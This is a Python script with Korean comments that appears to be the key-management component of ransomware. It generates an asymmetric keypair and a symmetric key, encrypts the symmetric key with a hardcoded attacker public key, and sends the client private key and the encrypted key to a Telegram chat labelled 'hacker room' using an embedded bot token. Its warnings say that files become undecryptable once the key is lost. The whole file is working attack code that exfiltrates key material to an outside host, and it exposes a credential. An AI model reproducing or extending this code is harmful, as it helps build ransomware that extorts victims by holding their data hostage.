import telegram, asyncio                    #텔레그램 송수신용
from nacl.public import PrivateKey, PublicKey, Box     #공개키암호
import nacl, nacl.secret
from datetime import datetime               #시간정보
from time import sleep                      #딜레이
import os, sys                              #파일 내부 디렉토리

#0. 기본 환경설정
#asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

PRIVATE_KEY_RSA_FILENAME=f"KEY_FILE"
PRIVATE_KEY_RSA=0
PUBLIC_KEY_RSA=0

PRIVATE_KEY_AES_FILENAME=f"KEY_FILE2"
PRIVATE_KEY_AES=0

PUBLIC_SERVER_RSA_KEY=PublicKey(b'=\xe5!\xfb\xf0\x82\xa2\x1f\x070\x0c\xad\xdcR\x16=\x03\\\xa8\x11\xc6\xa4\xa3\xd7,Kn;\n\xb8\xcd.')

AES_BOX=0

BOT=telegram.Bot(token='6516628933:AAHr__4L6DnlSiBXptkMsKi8DhvPwanGrJQ')#봇 토큰
CHAT_ID=5911780078#해커방

#1. RSA개인키 생성_스크립트 인자로 key path를 입력받으면 해당 내용을 읽어 로드(.py "privatePath")
def makeRSAKey():
    global PRIVATE_KEY_RSA, PUBLIC_KEY_RSA
    if os.path.isfile(PRIVATE_KEY_RSA_FILENAME):
        print("[DEBUG] Loading ClientPrivateKey...")
        with open(PRIVATE_KEY_RSA_FILENAME, 'rb') as File:
            byteCode=File.read()
        PRIVATE_KEY_RSA=PrivateKey(byteCode)
        print("************")
        print(type(PRIVATE_KEY_RSA))
        PUBLIC_KEY_RSA=PRIVATE_KEY_RSA.public_key
        print("[DEBUG] Loaded ClientPrivateKey")
        print(PRIVATE_KEY_RSA._private_key)
        print("[DEBUG] Derived ClientPublicKey")
        print(PUBLIC_KEY_RSA)
        print("[DEBUG] Key is completely Loaded!")
    else:
        print("[DEBUG] WARINING_Previous ClientRSAKey will be removed and we will create new key after 30 seconds. After covering key, we cannot decrypt your file. RESTORE KEY FILE")
        sleep(30)
        print("[DEBUG] Making ClientPrivateKey by using script argument...")
        PRIVATE_KEY_RSA=PrivateKey.generate()
        PUBLIC_KEY_RSA=PRIVATE_KEY_RSA.public_key
        with open(PRIVATE_KEY_RSA_FILENAME, 'wb') as File:
            File.write(PRIVATE_KEY_RSA._private_key)
        print("[DEBUG] Created ServerPrivateKey")
        print(PRIVATE_KEY_RSA._private_key)
        print("[DEBUG] Derived ServerPublicKey")
        print(PUBLIC_KEY_RSA)
        print("[DEBUG] Key is completely Saved!")

#2. AES 대칭키 생성
def makeAESKey():
    global PRIVATE_KEY_AES
    if os.path.isfile(PRIVATE_KEY_AES_FILENAME):
        print("[DEBUG] Loading AESKey...")
        with open(PRIVATE_KEY_AES_FILENAME, 'rb') as File:
            PRIVATE_KEY_AES=File.read()
        print("[DEBUG] Loaded AESKey")
        print(PRIVATE_KEY_AES)
    else:
        print("[DEBUG] WARINING_Previous AESKey will be removed and we will create new key after 30 seconds. After covering key, we cannot decrypt your file. RESTORE KEY FILE")
        sleep(30)
        print("[DEBUG] Making AESKey by using script argument...")
        PRIVATE_KEY_AES=nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
        with open(PRIVATE_KEY_AES_FILENAME, 'wb') as File:
            File.write(PRIVATE_KEY_AES)
        print("[DEBUG] Created AESKey")
        print(PRIVATE_KEY_AES)


#3. AES 대칭키 암호화
def encryptAES():
    global AES_BOX
    print("[DEBUG] Encrypting AESKey...")
    AES_BOX=Box(PRIVATE_KEY_RSA, PUBLIC_SERVER_RSA_KEY)
    encrypted_aes_key=AES_BOX.encrypt(PRIVATE_KEY_AES)
    print("[DEBUG] Complete Encryption")
    print(encrypted_aes_key)
    return encrypted_aes_key

#4. 클라이언트 공개키와 암호화된 대칭키 파일을 서버에 전송
async def sendTelegram(chat_id, msg):
    await BOT.send_message(chat_id, msg)
    
def sendKeyToServer(encrypted_aes_key):
    print(type(str(PRIVATE_KEY_RSA._private_key)), type(str(encrypted_aes_key)))
    print('[DEBUG] Sending key information to Server...')
    loop = asyncio.get_event_loop() # 이벤트 루프를 얻음
    loop.run_until_complete(sendTelegram(CHAT_ID, "ClientRSAPublicKey: ")) # 끝날 때까지 기다림
    #loop.close
    loop = asyncio.get_event_loop() 
    loop.run_until_complete(sendTelegram(CHAT_ID, str(PRIVATE_KEY_RSA._private_key))) 
    #loop.close
    loop = asyncio.get_event_loop()
    loop.run_until_complete(sendTelegram(CHAT_ID, "EncryptedClientAESKey: "))
    #loop.close
    loop = asyncio.get_event_loop()  
    loop.run_until_complete(sendTelegram(CHAT_ID, str(encrypted_aes_key)))
    #loop.close
    print('[DEBUG] Complete Sending')
    
if __name__=='__main__':
    makeRSAKey()
    print()
    makeAESKey()
    print()
    encrypted_aes_key=encryptAES()
    print()
    sendKeyToServer(encrypted_aes_key)
    
    
    print('hello')
